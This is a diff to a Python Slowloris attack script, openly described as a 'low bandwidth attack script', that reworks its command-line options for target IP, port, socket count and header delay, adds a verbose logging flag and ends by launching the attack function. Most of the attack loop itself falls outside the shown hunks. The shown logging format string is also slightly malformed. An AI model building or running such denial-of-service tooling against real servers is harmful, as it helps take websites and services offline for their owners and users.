@@ -1,20 +1,60 @@
 import argparse
+import logging
 import socket
 import random
 import time
 
-# Init parser
-parser = argparse.ArgumentParser(description="Slowloris-Low bandwith attack scrip")
-parser.add_argument("--ip", "-i", default="192.168.0.1", help="target ip address")
-parser.add_argument("--port", "-p", default="80", type=int, help="target port")
-parser.add_argument("--https", dest="https", action="store_true")
-parser.add_argument("--numsockets", "-ns", dest="numsockets", default=150, type=int, help="The number of sockets will be connected to the host")
-parser.add_argument("--sleeptime", dest="sleeptime", default=15, type=int, help="Time to sleep between each header sent.")
+# Read arguments
+parser = argparse.ArgumentParser(
+    description="Slowloris-Low bandwith attack scrip"
+)
+
+parser.add_argument(
+    "--ip", "-i", default="192.168.0.1", help="target ip address"
+)
+
+parser.add_argument(
+    "--port", "-p", default="80", type=int, help="target port"
+)
+
+parser.add_argument(
+    "--https", dest="https", action="store_true"
+)
+
+parser.add_argument(
+    "--numsockets", "-ns", dest="numsockets", default=150, type=int, help="The number of sockets will be connected to the host"
+)
+
+parser.add_argument(
+    "--sleeptime", dest="sleeptime", default=15, type=int, help="Time to sleep between each header sent."
+)
+
+parser.add_argument(
+    "--verbose", "-v", dest="verbose", action="store_true", help="Logging"
+)
+
 args = parser.parse_args()
 
-print("IP={}\nPORT={}\nNUMSOCKETS={}\nHTTPS={}\nSLEEPTIME={}\n".format(args.ip, args.port, args.numsockets, args.https, args.sleeptime))
+print(
+    "IP={}\nPORT={}\nNUMSOCKETS={}\nHTTPS={}\nSLEEPTIME={}\nVERBOSE={}\n".format(
+        args.ip, args.port, args.numsockets, args.https, args.sleeptime, args.verbose
+    )
+)
 
-# Read agents file 
+if args.verbose:
+    logging.basicConfig(
+        format="[%(asctime)] %(message)s",
+        datefmt="%d-%m-%Y %H:%M:%S",
+        level=logging.DEBUG
+    )
+else:
+    logging.basicConfig(
+        format="[%(asctime)] %(message)s",
+        datefmt="%d-%m-%Y %H:%M:%S",
+        level=logging.INFO
+    )
+
+# Read agents file
 agents = []
 with open("agents.txt", "r") as content:
     for line in content:
@@ -74,4 +114,3 @@ def _performattack_():
             break
 
 _performattack_()
-
